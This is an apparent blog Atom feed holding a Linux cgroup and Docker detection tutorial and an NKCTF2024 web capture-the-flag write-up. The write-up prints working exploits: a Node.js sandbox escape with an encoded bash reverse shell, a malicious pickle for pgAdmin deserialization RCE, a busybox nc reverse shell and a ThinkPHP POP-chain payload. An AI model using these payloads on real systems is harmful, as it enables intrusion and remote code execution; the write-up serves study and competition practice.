@@ -1,0 +1,1981 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://skyblu3519.github.io</id>
+    <title>skkyblu3</title>
+    <updated>2024-03-26T15:28:31.295Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://skyblu3519.github.io"/>
+    <link rel="self" href="https://skyblu3519.github.io/atom.xml"/>
+    <subtitle>sky, blue and ...</subtitle>
+    <logo>https://skyblu3519.github.io/images/avatar.png</logo>
+    <icon>https://skyblu3519.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, skkyblu3</rights>
+    <entry>
+        <title type="html"><![CDATA[[Docker容器安全1] cgroup v1初识]]></title>
+        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-1-cgroup-v1-chu-shi/</id>
+        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-1-cgroup-v1-chu-shi/">
+        </link>
+        <updated>2024-03-26T15:21:15.000Z</updated>
+        <content type="html"><![CDATA[<p>今天学习云原生安全中docker逃逸相关内容，首先是判断是否为容器环境</p>
+<pre><code class="language-shell">cat /proc/1/cgroup | grep -qi docker &amp;&amp; echo &quot;Is Docker&quot; || echo &quot;Not Docker&quot;
+</code></pre>
+<p>wait, 这个cgroup是啥？</p>
+<h1 id="相关概念">相关概念</h1>
+<h2 id="task">Task</h2>
+<blockquote>
+<p>Task(任务)： 在 linux 系统中，内核本身的调度和管理并不对进程和线程进行区分，只是根据 clone() 时传入的参数的不同来从概念上区分进程和线程。这里使用 task 来表示系统的一个进程或线程。</p>
+</blockquote>
+<h2 id="cgroup">Cgroup</h2>
+<blockquote>
+<p>Cgroup(控制组)：cgroups 中的资源控制以 cgroup 为单位实现。Cgroup 表示按某种资源控制标准划分而成的任务组，包含一个或多个子系统。一个任务可以加入某个 cgroup，也可以从某个 cgroup 迁移到另一个 cgroup。</p>
+</blockquote>
+<p>划分组的目的就是方便管理，管理Linux中任务调度的资源用的就是cgroup。另外，cgroup在不同的上下文中代表不同的意思，可以指整个Linux的<strong>cgroup技术</strong>，也可以指一个<strong>具体进程组</strong>。</p>
+<h2 id="subsystem">Subsystem</h2>
+<blockquote>
+<p>Subsystem(子系统)：cgroups 中的子系统就是一个资源调度控制器(又叫 controllers)。比如 CPU 子系统可以控制 CPU 的时间分配，内存子系统可以限制内存的使用量。以笔者使用的 Ubuntu 16.04.3 为例，其内核版本为 4.10.0，支持的 subsystem 如下( cat /proc/cgroups)：</p>
+<ul>
+<li>blki：对块设备的 IO 进行限制。</li>
+<li>cpu：限制 CPU 时间片的分配，与 cpuacct 挂载在同一目录。</li>
+<li>cpuacct：生成 cgroup 中的任务占用 CPU 资源的报告，与 cpu 挂载在同一目录。</li>
+<li>cpuset：给 cgroup 中的任务分配独立的 CPU(多处理器系统) 和内存节点。</li>
+<li>devices：允许或禁止 cgroup 中的任务访问设备。</li>
+<li>freezer：暂停/恢复 cgroup 中的任务。</li>
+<li>hugetlb：限制使用的内存页数量。</li>
+<li>memory：对 cgroup 中的任务的可用内存进行限制，并自动生成资源占用报告。</li>
+<li>net_cls：使用等级识别符（classid）标记网络数据包，这让 Linux 流量控制器（tc 指令）可以识别来自特定 cgroup 任务的数据包，并进行网络限制。</li>
+<li>net_prio：允许基于 cgroup 设置网络流量(netowork traffic)的优先级。</li>
+<li>perf_event：允许使用 perf 工具来监控 cgroup。</li>
+<li>pids：限制任务的数量。</li>
+</ul>
+</blockquote>
+<p>简单理解Subsystem就是对Linux某一资源的管理，到目前为止，Linux支持12种subsystem。</p>
+<h2 id="hierarchy">Hierarchy</h2>
+<blockquote>
+<p>Hierarchy(层级)：一个hierarchy可以理解为一棵cgroup树，树的每个节点就是一个进程组，每棵树都会与零到多个subsystem关联。在一颗树里面，会包含Linux系统中的所有进程，但每个进程只能属于一个节点（进程组）。系统中可以有很多颗cgroup树，每棵树都和不同的subsystem关联，一个进程可以属于多颗树，即一个进程可以属于多个进程组，只是这些进程组和不同的subsystem关联。目前Linux支持12种subsystem，如果不考虑不与任何subsystem关联的情况（systemd就属于这种情况），Linux里面最多可以建12颗cgroup树，每棵树关联一个subsystem，当然也可以只建一棵树，然后让这棵树关联所有的subsystem。当一颗cgroup树不和任何subsystem关联的时候，意味着这棵树只是将进程进行分组，至于要在分组的基础上做些什么，将由应用程序自己决定，systemd就是一个这样的例子。</p>
+</blockquote>
+<p>这个 hierarchy 的定义实在是有点抽象，所以我决定用个例子帮助理解。</p>
+<h3 id="举个栗子">举个栗子</h3>
+<p>我们假设有一个应用，它由两部分组成：一个前端服务和一个后端服务。我们想要确保后端服务（处理数据和逻辑的核心部分）总是有足够的<strong>内存</strong>（memory）资源，而前端服务（处理用户界面的部分）则在资源紧张时可以被适当限制。</p>
+<h4 id="创建顶层结构">创建顶层结构</h4>
+<p>既然要限制内存，我们我们肯定要在<strong>memory</strong>这个子系统下创建我们应用的<strong>cgroup</strong>。于是我们创建了一个顶层cgroup（<strong>root_group</strong>）代表整个应用</p>
+<pre><code class="language-shell"># 创建顶层 cgroup
+mkdir /sys/fs/cgroup/memory/root_group
+</code></pre>
+<p>其实这里隐含了一层意思，我们在一颗树上的根结点上新建了一个子结点，而这棵树是与<strong>memory subsystem</strong>相关联的。</p>
+<h4 id="创建子cgroup">创建子cgroup</h4>
+<p>在 <strong>root_group</strong> 下，我们创建两个子 <strong>cgroup</strong>：<strong>backend_group</strong> 和 <strong>frontend_group</strong>，其中：</p>
+<ul>
+<li><strong>backend_group</strong>：用于后端服务，确保核心服务有足够的资源。</li>
+<li><strong>frontend_group</strong>：用于前端服务，其资源可以被适当限制以保证后端服务的资源需求。</li>
+</ul>
+<pre><code class="language-shell"># 创建子 cgroup
+mkdir /sys/fs/cgroup/memory/root_group/backend_group
+mkdir /sys/fs/cgroup/memory/root_group/frontend_group
+</code></pre>
+<h4 id="设置内存限制">设置内存限制</h4>
+<ul>
+<li><strong>backend_group</strong>：不设置硬性限制，或者设置一个较高的限制，确保后端服务有足够的资源可用。</li>
+<li><strong>frontend_group</strong>：设置较低的内存限制，比如 50MB，确保在资源紧张时，前端服务的资源使用被适当限制。</li>
+</ul>
+<pre><code class="language-shell"># 设置前端服务的内存限制为 50MB
+echo 52428800 &gt; /sys/fs/cgroup/memory/root_group/frontend_group/memory.limit_in_bytes
+</code></pre>
+<h4 id="将进程添加到相应的-cgroup-中">将进程添加到相应的 cgroup 中</h4>
+<ul>
+<li>将后端服务的进程 PID 添加到 backend_group。</li>
+<li>将前端服务的进程 PID 添加到 frontend_group。</li>
+</ul>
+<pre><code class="language-shell"># 添加进程到 cgroup
+echo 1234 &gt; /sys/fs/cgroup/memory/root_group/frontend_group/cgroup.procs
+# 假设后端服务的 PID 为 5678
+echo 5678 &gt; /sys/fs/cgroup/memory/root_group/backend_group/cgroup.procs
+</code></pre>
+<p>这两个进程就加入了与内存相关联的子系统的这棵树下的具体的节点（cgroup），当然他们也可以加入到其他不同的树中，受这些树所关联的子系统的控制。</p>
+<h1 id="cgroups的文件系统接口">cgroups的文件系统接口</h1>
+<p>cgroups 以文件的方式提供应用接口，我们可以通过 mount 命令来查看 cgroups 默认的挂载点：<code>mount | grep cgroup</code></p>
+<pre><code>[root@xdd ~]# mount | grep cgroup
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_prio,net_cls)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)
+cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+</code></pre>
+<p>执行这个命令后返回的内容解释如下：</p>
+<ul>
+<li>第一行：<code>tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)</code> 显示了一个<strong>tmpfs</strong>（临时文件系统）被挂载在 <code>/sys/fs/cgroup</code>。
+<ul>
+<li><strong>cgroup</strong>：文件系统的根目录</li>
+<li><strong>tmpfs</strong>： 意味着 cgroup 的元数据和控制文件存储<strong>在内存中</strong>，而不是磁盘上，这样可以提高访问速度。</li>
+<li><strong>ro,nosuid,nodev,noexec,mode=755</strong>：描述了挂载的选项，例如只读（<strong>ro</strong>）、不允许 set-user-identifier 或 set-group-identifier 权限（<strong>nosuid</strong>）、禁止执行设备文件（<strong>nodev</strong>）、禁止执行任何二进制文件（<strong>noexec</strong>），以及目录的访问权限（<strong>mode=755</strong>）。</li>
+</ul>
+</li>
+<li>第二行：<code>cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)</code>这里涉及到 systemd 管理的 cgroup。在使用 systemd 系统的操作系统中，/sys/fs/cgroup 目录都是由 systemd 在系统启动的过程中挂载的，并且挂载为只读的类型。换句话说，系统是不建议我们在 /sys/fs/cgroup 目录下创建新的目录并挂载其它子系统的。这一点与之前的操作系统不太一样（🤔）。</li>
+<li>其余行：每个 cgroup 子系统的挂载点，对应了可以控制的资源类型。比如<code>cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup</code> 表示 CPU 时间和 CPU 使用统计的 cgroup 子系统共同挂载在 <code>/sys/fs/cgroup/cpu,cpuacct</code>。</li>
+</ul>
+<p>/sys/fs/cgroup及其子目录memory结构<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711442513857-73c79df1-5fbb-4ba7-af46-74141c00adda.png" alt="image.png" loading="lazy"></p>
+<p>/sys/fs/cgroup 目录下是各个子系统的根目录。memory 目录下的文件就是 cgroups 的 memory 子系统中的根级设置。比如 memory.limit_in_bytes 中的数字用来限制进程的最大可用内存，memory.swappiness 中保存着使用 swap 的权重等等。</p>
+<h1 id="进程所属的cgroup">进程所属的cgroup</h1>
+<p>可以通过 <code>/proc/[pid]/cgroup</code> 来查看指定进程属于哪些 cgroup：<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711442783301-a70bc3f1-6189-4ad3-8d3b-b252b8ca9b64.png" alt="image.png" loading="lazy"></p>
+<p>这个 cgroup 信息显示了进程 ID 为 794 的进程所属的 cgroup 配置。每一行都代表该进程在不同 cgroup 子系统下的归属情况。格式通常为 <code>层级编号:子系统名称:路径</code>：</p>
+<ul>
+<li><strong>层级编号</strong>：cgroup 树的 ID， 和 /proc/cgroups 文件中的 ID 一一对应。</li>
+<li><strong>子系统名称</strong>：表示 cgroup 控制的资源类型。例如 cpu、memory、blkio 等。有些行中出现的是组合子系统，如 cpuacct,cpu，意味着这些资源控制器被组合在一起管理。</li>
+<li><strong>路径</strong>：显示进程所属的 cgroup 在 cgroup 文件系统中的路径。例如，/system.slice/httpd.service 表示进程属于名为 httpd.service 的服务单元管理的 cgroup。路径 / 表示根 cgroup，也就是最顶层的 cgroup，它通常用于未被特别分配到其他特定 cgroup 的进程。</li>
+</ul>
+<p>PS.可以通过查看/proc/cgroups(since Linux 2.6.24)知道当前系统支持哪些subsystem，下面是一个例子</p>
+<pre><code class="language-shell">#subsys_name    hierarchy       num_cgroups     enabled
+cpuset          11              1               1
+cpu             3               64              1
+cpuacct         3               64              1
+blkio           8               64              1
+memory          9               104             1
+devices         5               64              1
+freezer         10              4               1
+net_cls         6               1               1
+perf_event      7               1               1
+net_prio        6               1               1
+hugetlb         4               1               1
+pids            2               68              1
+</code></pre>
+<p>从左到右，字段的含义分别是：</p>
+<ol>
+<li>subsystem的名字</li>
+<li>subsystem所关联到的cgroup树的ID，如果多个subsystem关联到同一颗cgroup树，那么他们的这个字段将一样，比如这里的cpu和cpuacct就一样，表示他们绑定到了同一颗树。如果出现下面的情况，这个字段将为0：
+<ul>
+<li>当前subsystem没有和任何cgroup树绑定</li>
+<li>当前subsystem已经和cgroup v2的树绑定</li>
+<li>当前subsystem没有被内核开启</li>
+</ul>
+</li>
+<li>subsystem所关联的cgroup树中进程组的个数，也即树上节点的个数</li>
+<li>1表示开启，0表示没有被开启(可以通过设置内核的启动参数“cgroup_disable”来控制subsystem的开启).</li>
+</ol>
+<p>关于<code>1:name=systemd:/system.slice/httpd.service</code>（🤔）：</p>
+<ul>
+<li><strong>name=systemd</strong>： 这部分说明这个特定的 cgroup 层级是由 systemd 使用的，而不是由单一的资源类型（如 cpu 或 memory）直接控制。name=systemd 表示这个层级是专门为 systemd 使用而设置的一个命名层级，用来管理和组织由 systemd 控制的服务。这是 cgroup v1 中支持为各种不同的目的创建命名层级的功能之一。</li>
+<li><strong>/system.slice/httpd.service</strong>: 这部分显示了 cgroup 在文件系统中的路径。这个路径指示进程属于 httpd.service 服务，这是一个 systemd 服务单元的名称。在 systemd 的体系中，system.slice 是一个<strong>用于组织系统服务的分片</strong>（slice），而 httpd.service 则是运行在这个分片中的特定服务。</li>
+<li>与其他行相比，这行信息的特殊之处在于它直接关联到 systemd，而不是标准的资源类型子系统。systemd 使用它自己的 cgroup 层级来组织和管理服务，这使得 systemd 能够利用 cgroup 提供的功能来执行诸如服务启动、停止、重启以及资源限制等操作。</li>
+</ul>
+<h1 id="cgroup测试">cgroup测试</h1>
+<h2 id="安装cgroups工具">安装cgroups工具</h2>
+<p>Centos下安装cgroup 工具：</p>
+<ul>
+<li>安装 libcgroup</li>
+</ul>
+<pre><code>yum install libcgroup
+</code></pre>
+<ul>
+<li>安装 libcgroup-tools</li>
+</ul>
+<pre><code>yum install libcgroup-tools
+</code></pre>
+<ul>
+<li>验证安装，使用 cgget 命令查看当前 cgroup 配置</li>
+</ul>
+<pre><code>cgget -g cpu:/
+</code></pre>
+<h2 id="测试限制进程可用的-cpu">测试：限制进程可用的 CPU</h2>
+<p>在<code>/sys/fs/cgroup/cpu</code> 目录下新建一个名称为 skky_cpu 的目录：</p>
+<pre><code class="language-shell">mkdir /sys/fs/cgroup/cpu/skky_cpu
+</code></pre>
+<p>cgroups 的文件系统会在创建文件目录的时候自动创建相关的配置文件<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711444614768-1f6d4ab8-14f8-4f4a-87c2-158a498fe71e.png" alt="image.png" loading="lazy"></p>
+<p>在设置skky_cpu前，先看下默认的相关配置：</p>
+<pre><code class="language-shell">[root@xdd ~]# cat /sys/fs/cgroup/cpu/cpu.cfs_period_us
+100000
+[root@xdd ~]# cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us
+-1
+</code></pre>
+<ul>
+<li>**cpu.cfs_period_us：**表示调度周期的长度，以微秒（us）为单位。在这个周期内，cgroup 可以被限制只能使用一定量的 CPU 时间，必须与cfs_quota_us配合使用。</li>
+<li><strong>cpu.cfs_quota_us ：<strong>设定周期内最多可使用的时间，这里的配置指 task 对单个 cpu 的使用上限。假如</strong>cpu.cfs_period_us</strong> 被设置为 100000（即 100 毫秒），而 **cpu.cfs_quota_us **被设置为 10000（即 10 毫秒）。这意味着，在每 100 毫秒的时间窗口中，属于该 cgroup 的进程总共能使用最多 10 毫秒的 CPU 时间。这相当于分配了 10% 的 CPU 时间给该 cgroup。而默认配置中这个值为-1，表示表示不对该 cgroup 的 CPU 时间使用量做限制。</li>
+</ul>
+<p>现在我们吧skky_cpu的 CPU 周期限制为总量的十分之一：</p>
+<pre><code class="language-shell">echo 10000 &gt; /sys/fs/cgroup/cpu/skky_cpu/cpu.cfs_quota_us
+</code></pre>
+<p>用一个CPU 密集型的程序测试：</p>
+<pre><code class="language-c">void main(){
+    unsigned int i, end;
+
+    end = 1024 * 1024 * 1024;
+    for(i = 0; i &lt; end; )
+    {
+        i ++;
+    }
+}
+</code></pre>
+<p>编译并执行：</p>
+<pre><code class="language-shell">gcc cputime.c -o cputime
+time ./cputime
+time cgexec -g cpu:skky_cpu ./cputime
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711452018680-80811a51-bf38-439d-8b1a-bc0d10d02fa1.png" alt="image.png" loading="lazy"></figure>
+<p>可以看到程序正常运行的时间为2.5s，而添加 cgroup 的运行时间为28s。</p>
+<h1 id="使用cgroup判断容器环境">使用Cgroup判断容器环境</h1>
+<p>在docker容器pid为1的进程，通常是容器的初始化进程</p>
+<pre><code class="language-shell">root@662559eb1259:/# cat /proc/1/cgroup
+11:cpuset:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+10:memory:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+9:freezer:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+8:hugetlb:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+7:cpuacct,cpu:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+6:blkio:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+5:devices:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+4:perf_event:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+3:pids:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+2:net_prio,net_cls:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+1:name=systemd:/docker/662559eb1259dd29170985293fdcc5465cca5ac1c655bba37aa364cb988670e9
+</code></pre>
+<p>从这个响应可以看到，在docker容器中所有cgroup子系统的路径都是<code>/docker/[容器ID]</code>，这就是使用<code>cat /proc/1/cgroup</code>可以判断当前是否为容器环境的原因。</p>
+<h2 id="cgroup-v2">cgroup v2</h2>
+<p>cgroup v2 是对最初的 cgroup（控制组）机制的重大改进和简化，在v2中不再为每种资源类型（如 CPU、内存等）创建独立的层级，而是引入单一的层级系统，所有类型的资源都在这个统一的层级下管理。<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711455747561-eb5add86-525c-4126-9834-237d874c6605.png" alt="image.png" loading="lazy"></p>
+<p>关于cgroup v2 具体的细节这里先不关心，简单说下对docker的影响。使用<code>cat /proc/1/cgroup</code>的输出为：</p>
+<pre><code class="language-shell">root@015731e32eb9:/# cat /proc/1/cgroup
+0::/
+</code></pre>
+<ul>
+<li><code>0</code>: 这个部分表示 cgroup 的层级编号。在 cgroup v2 中，由于只有一个统一的层级，所以这个编号是 <code>0</code>。这是一个标志性的变化，表明系统使用的是 cgroup v2。</li>
+<li><code>::</code> 这个部分原本在 cgroup v1 中用于分隔层级编号和子系统列表（例如 cpu, memory）。在 cgroup v2 中，由于不再需要指定子系统（所有资源控制都在一个层级中），因此这里不再显示具体的子系统名称，仅用冒号表示分隔。</li>
+<li><code>/</code> 这个部分表示 cgroup 的路径。在这个上下文中，<code>/</code> 指的是根 cgroup，也就是整个 cgroup 层级的最顶层。进程号为 1 的进程（系统的初始化进程，通常是 systemd 或 init）属于这个最顶层的 cgroup，表示它有权管理和控制系统中的所有其他进程和资源。</li>
+</ul>
+<p>宿主机上有关docker容器的cgroup信息在<code>/sys/fs/cgroup/system.slice/</code>目录下，格式为</p>
+<pre><code class="language-shell">/sys/fs/cgroup/system.slice/docker-&lt;longid&gt;.scope/
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711464780383-ca74ca26-6af1-4569-ab2c-6b132b3b13d3.png" alt="image.png" loading="lazy"></figure>
+<p>如果要在 cgroup v2 查出 docker 容器的ID号，可以查看<code>/proc/1/mountinfo</code>文件，里面是进程的挂载点信息<br>
+<img src="https://skyblu3519.github.io/post-images/dockerSec_1/1711464948514-7165a872-95ab-4967-ae0b-67b9b81abdcc.png" alt="image.png" loading="lazy"></p>
+<h1 id="参考文章">参考文章</h1>
+<p><a href="https://www.cnblogs.com/sparkdev/p/8296063.html">https://www.cnblogs.com/sparkdev/p/8296063.html</a><br>
+<a href="https://segmentfault.com/a/1190000006917884">https://segmentfault.com/a/1190000006917884</a><br>
+<a href="https://mikechengwei.github.io/2020/06/03/cgroup%E5%8E%9F%E7%90%86/">https://mikechengwei.github.io/2020/06/03/cgroup%E5%8E%9F%E7%90%86/</a><br>
+<a href="https://stackoverflow.com/questions/68816329/how-to-get-docker-container-id-from-within-the-container-with-cgroup-v2">https://stackoverflow.com/questions/68816329/how-to-get-docker-container-id-from-within-the-container-with-cgroup-v2</a><br>
+<a href="https://zone.huoxian.cn/d/990">https://zone.huoxian.cn/d/990</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[NKCTF2024 WP WEB]]></title>
+        <id>https://skyblu3519.github.io/post/nkctf2024-wp-web/</id>
+        <link href="https://skyblu3519.github.io/post/nkctf2024-wp-web/">
+        </link>
+        <updated>2024-03-24T13:56:36.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="my-first-cms">my first cms</h1>
+<p>CVE-2024-27622：<a href="https://github.com/capture0x/CMSMadeSimple/">https://github.com/capture0x/CMSMadeSimple/</a></p>
+<p>后台弱口令Admin/Admin123（你确定这是弱口令😡），进去打就行<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285436294-8e10b8e4-d8bf-474f-bfaa-457150a6cba3.png" alt="image.png" loading="lazy"></p>
+<h1 id="全世界最简单的ctf">全世界最简单的CTF</h1>
+<p>Nodejs沙箱逃逸，sandbox为null的情况，参考：<a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQLpGDcnxArh70rD#toc-4">vm沙箱逃逸的一些其他情况</a></p>
+<pre><code class="language-javascript">function waf(code) {
+    let pattern = /(process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function)/g;
+    if(code.match(pattern)){
+        throw new Error(&quot;what can I say? hacker out!!&quot;);
+    }
+}
+
+app.post('/', function (req, res){
+        let code = req.body.code;
+        let sandbox = Object.create(null);
+        let context = vm.createContext(sandbox);
+        try {
+            waf(code)
+            let result = vm.runInContext(code, context);
+            console.log(result);
+        } catch (e){
+            console.log(e.message);
+            require('./hack');
+        }
+})
+</code></pre>
+<p><code>process</code>、<code>child_process</code>使用url编码绕过，<code>execSync</code>方法通过<code>Reflect.get</code>获取。直接反弹shell</p>
+<pre><code class="language-javascript">throw new Proxy({}, {
+    get: function(){
+        const cc = arguments.callee.caller;
+        const bb = decodeURIComponent('%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73');
+        const cp = decodeURIComponent('%63%68%69%6c%64%5f%70%72%6f%63%65%73%73');
+        const es = decodeURIComponent('%65%78%65%63%53%79%6e%63');
+        const p = (cc.constructor.constructor(bb))();
+        const childProcess = p.mainModule.require(cp);
+        const e = Reflect.get(childProcess, es);
+        return e('bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/9898 0&gt;&amp;1&quot;').toString();
+    }
+})
+</code></pre>
+<p>get flag<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711285760550-2b597a2b-2f1e-477c-889e-40873cd6b14b.png" alt="image.png" loading="lazy"></p>
+<h1 id="attack">attack</h1>
+<p>pgAdmin8.3 RCE 参考：<a href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">pgAdmin (&lt;=8.3) Path Traversal in Session Handling Leads to Unsafe Deserialization and Remote Code Execution (RCE)</a></p>
+<p>原理比较简单，在处理<code>pga4_session</code>（格式为<code>&lt;sid&gt;!&lt;digest&gt;</code>）的时候，程序会将<code>sid</code>所指的文件读取并使用pickle反序列化。这道题给了登录用户tacooooo@qq.com/tacooooo，Storage Manager上传为位置为<code>../storage/tacooooo_qq.com/</code>。题目没有bash和curl，通过本地对漏洞的复现知道了Storage Manager上传的绝对路径可能为<code>/var/lib/pgadmin/storage/tacooooo_qq.com/</code>，那就可以把命令执行的结果写到这个目录下，然后下载。</p>
+<p>解题流程如下：</p>
+<ul>
+<li>使用脚本生成<code>skky.pkl</code></li>
+</ul>
+<pre><code class="language-javascript">import struct
+
+def produce_pickle_bytes(platform, cmd):
+    b = b'\x80\x04\x95'
+    b += struct.pack('L', 22 + len(platform) + len(cmd))
+    b += b'\x8c' + struct.pack('b', len(platform)) + platform.encode()
+    b += b'\x94\x8c\x06system\x94\x93\x94'
+    b += b'\x8c' + struct.pack('b', len(cmd)) + cmd.encode()
+    b += b'\x94\x85\x94R\x94.'
+    print(b)
+    return b
+
+
+cmd = &quot;ls / &gt;&gt; /var/lib/pgadmin/storage/tacooooo_qq.com/result&quot;
+content = produce_pickle_bytes('posix', f&quot;{cmd}&quot;)
+with open('skky.pkl', 'wb') as f:
+    f.write(content)
+</code></pre>
+<ul>
+<li>登录用户选择Tools &gt; Storage Manager上传pkl</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286776522-21a7a65f-0b57-4ec8-8509-5e5780c33bd4.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>构造<code>Cookie: pga4_session=../storage/tacooooo_qq.com/skky.pkl!a</code>访问触发反序列化</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286849342-acf60a09-fc3d-4401-9a3b-deb275d17be4.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>下载result查看执行结果</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/nkctf2024/1711286909606-6e387c32-477c-4f8c-89d0-941b507c1cfa.png" alt="image.png" loading="lazy"></figure>
+<p>执行<code>ls -la /bin/sh</code>发现有busybox</p>
+<pre><code>lrwxrwxrwx    1 root     root            12 Jan 26 17:53 /bin/sh -&gt; /bin/busybox
+</code></pre>
+<p>可以用busybox提供的nc弹一个sh的shell</p>
+<pre><code>/bin/busybox nc xxxxxx 9999 -e /bin/sh
+</code></pre>
+<p>最后在/run.sh进程的环境变量中找到flag <code>cat /proc/1/environ</code><br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711189736765-fcc768f0-ed30-4f31-aec2-40d5f6f1c742.png" alt="image.png" loading="lazy"></p>
+<h1 id="用过就是熟悉">用过就是熟悉</h1>
+<p>打开源码，找到提示文件<code>app/controller/user/think/hinthinthinthinthinthinthint.php</code>。全局搜索文件名称<code>hinthinthinthinthinthinthint.php</code>，在<code>app/controller/user/think/Testone.php</code>中有将<code>hinthinthinthinthinthinthint.php</code>的<code>$content</code>写入的功能</p>
+<pre><code class="language-php">&lt;?php
+
+namespace think;
+header('Content-Type: text/html; charset=UTF-8');
+abstract class Testone
+{
+
+    //The end of the unserialize.
+    public function countTxtFiles($directory) {
+        $txtFiles = glob($directory . '/*.txt');
+        foreach ($txtFiles as $txtFile) {
+            if (is_file($txtFile)) {
+                unlink($txtFile);
+            }
+        }
+    }
+
+
+    public function __call($name, $arguments)
+    {
+        $a = time();
+        if ($arguments[0]['time']==='10086'){
+            $this-&gt;countTxtFiles(&quot;./app/controller/user/think/&quot;);
+            include('./app/controller/user/think/hinthinthinthinthinthinthint.php');
+            file_put_contents('./app/controller/user/think/'.md5($a),$content);
+        }
+    }
+}
+</code></pre>
+<p>同时，处理登录处存在反序列化<br>
+<img src="https://skyblu3519.github.io/post-images/nkctf2024/1711277351912-1d16e8a2-5cc7-4e82-b388-e2c1a9333bbd.png" alt="image.png" loading="lazy"></p>
+<p>POP链构造不是很复杂，需要注意的就是namespace和Testone的实现类</p>
+<pre><code>windows::__destruct -&gt; removeFiles() -&gt; collection::__toString -&gt; view::__get -&gt; Debug::__call
+</code></pre>
+<p>POP构造如下：</p>
+<pre><code class="language-php">&lt;?php
+namespace think\process\pipes;
+use think\Collection;
+
+class Windows {
+    public function __construct()
+    {
+        $this-&gt;fileHandles = [];
+        $this-&gt;files = [new Collection()];
+    }
+}
+
+
+namespace think;
+class Collection{
+    public function __construct()
+    {
+        $this-&gt;items = new View();
+    }
+
+}
+
+namespace think;
+class View{
+    public function __construct()
+    {
+        $this-&gt;data = array(&quot;Loginout&quot; =&gt; new Debug());
+        $this-&gt;engine = array(&quot;time&quot; =&gt;&quot;10086&quot;);
+    }
+}
+
+namespace think;
+class Debug {
+}
+
+use think\process\pipes\Windows;
+echo base64_encode(serialize(new Windows()));
